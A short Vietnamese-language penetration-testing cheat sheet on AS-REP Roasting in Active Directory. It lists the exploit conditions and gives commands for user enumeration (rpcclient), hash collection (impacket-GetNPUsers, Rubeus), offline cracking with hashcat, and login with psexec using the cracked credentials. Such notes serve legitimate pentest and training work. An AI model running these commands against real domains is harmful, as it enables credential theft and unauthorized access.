# AS-REP Roasting

## Điểm chính khai thác

* **Lỗ hổng**: Tài khoản người dùng có mật khẩu yếu.
* **Tác động**: Lấy hash AS-REP, crack offline để lấy mật khẩu cleartext.
* **Điều kiện khai thác:**&#x20;
  * Tài khoản mục tiêu bật **`Do not require kerberos preauthentication`.**
  * Tấn công từ xa
    * Tìm được 1 tài khoản hợp lệ để có thể liệt kê người dùng trong domain.
    * Cổng UDP 88 (Kerberos) mở.

## Kiểm tra lỗ hổng

### Liệt kê tài khoản

Thu thập danh sách tài khoản để tấn công:

```
rpcclient -U "" <dc_ip> -N -c "enumdomusers"
```

## Tấn công từ xa

### Thu thập hash AS-REP

Gửi AS-REQ để lấy hash AS-REP của tài khoản không yêu cầu preauthentication:

{% code overflow="wrap" %}

```
impacket-GetNPUsers -dc-ip <dc_ip> <domain>/<user> -no-pass -outputfile as.txt
```

{% endcode %}

### Crack hash

Crack hash AS-REP để lấy mật khẩu cleartext:

```
hashcat -m 18200 as.txt <wordlist>
```

## Tấn công nội bộ

### Thu thập hash AS-REP

Lấy hash AS-REP từ máy Windows trong domain:

```
Rubeus.exe asreproast /format:hashcat /outfile:as.txt
```

### Crack hash

Crack hash AS-REP để lấy mật khẩu cleartext:

```
hashcat -m 18200 as.txt <wordlist>
```

## Kiểm tra kết quả

### Lệnh

Kiểm tra mật khẩu cleartext sau khi crack:

```
hashcat -m 18200 <hash_file> as.txt --show
```

### Xác nhận

Dùng mật khẩu lấy được để truy cập hệ thống mục tiêu:

```
impacket-psexec <domain>/<user>:<pass>@<dc_ip>
```
